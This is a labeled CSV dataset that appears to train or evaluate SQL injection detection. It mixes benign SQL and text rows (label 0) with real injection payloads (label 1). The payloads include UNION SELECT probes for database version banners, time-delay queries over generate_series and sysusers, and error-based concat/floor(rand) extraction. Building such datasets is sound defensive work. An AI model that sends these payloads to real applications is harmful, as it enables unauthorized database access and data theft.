Query,Label
"-4993"" union all select 6959,6959,6959--",1
"1'  )   where 6274  =  6274 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
eial,0
slezak@ballerpoker.kn,0
SELECT prepare ( s FROM shade RIGHT JOIN,0
coria,0
"juan de salcedo, 158 5?f",0
letra bala,0
" select * from users where id  =  1 <@1$ union select 1,version  (    )   -- 1",1
1%' and   (  3020  =  3020  )  *6703 and '%'  =  ',1
SELECT TOP 3 * FROM source WHERE held = 'hard',0
SELECT ago ( s FROM master RIGHT JOIN,0
shing-mi,0
calvin@espaciodelpintor.by,0
"1  )   where 7199  =  7199 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"1'  )   as keom where 7524  =  7524 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT TOP 50 PERCENT * FROM glass SELECT * FROM camp FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM sleep,0
"INSERT INTO give  ( road, mighty, excellent )  VALUES  ( 'if', 'flow', 'everything' )  ",0
"-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--",1
-1564'  )   order by 1--,1
" select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1
" SELECT column_name ( s )  FROM chain,breakfast",0
SELECT * FROM build FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM sleep,0
"1 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1
"-5597'  )   or make_set  (  2490  =  2164,2164  )  ",1
"1' where 6853  =  6853 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
1   )    )    as klmm where 3107  =  3107,1
SELECT * FROM Customers  WHERE City LIKE '%es%';,0
SELECT attached ( s )  FROM particles UNION,0
SELECT TOP 50 PERCENT * FROM instance,0
lacey@bwds.mp,0
"-4095'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
SELECT * FROM north WHERE metal BETWEEN '1996-07-01' AND '1996-07-31',0
"-5132%""   )    )    or 3038  =  3038",1
clipsham5,0
SELECT MIN ( occur )  AS sand FROM capital,0
SELECT * FROM affect WHERE dirt = 'camp'  OR yellow = 'salmon',0
SELECT human FROM heading,0
1'+  (  select nxfp where 5006  =  5006,1
SELECT option_value FROM wp_options WHERE option_name  =  '_site_transient_timeout_wp_wps_bg_image_sync_1_process_lock' LIMIT 1,0
SELECT * FROM exciting WHERE region IN  ( SELECT stuck FROM appropriate ) ,0
"INSERT INTO vote ( flat, trap, card, score, correctly, law )  VALUES  ( 'market', 'chose'. zero', 'within', 'gas', 'waste', 'screen' )  ",0
SELECT * FROM ran,0
"1'  )   where 5276  =  5276 union all select null,null--",1
SELECT * FROM bad 3,0
"lealtad, 78, 6-h",0
"  SELECT * FROM heavy WHERE compare NOT IN  ( 'team', 'attack', 'underline' )  ",0
"INSERT INTO difficult  ( explanation, complete, someone )  VALUES  ( 'nervous', 'wear', 'spite' )  ",0
"1""  )   where 8095  =  8095 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1
SELECT * FROM snake FETCH FIRST 3 ROWS ONLY,0
"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""ikaf"" like ""ikaf",1
7.31467E+14,0
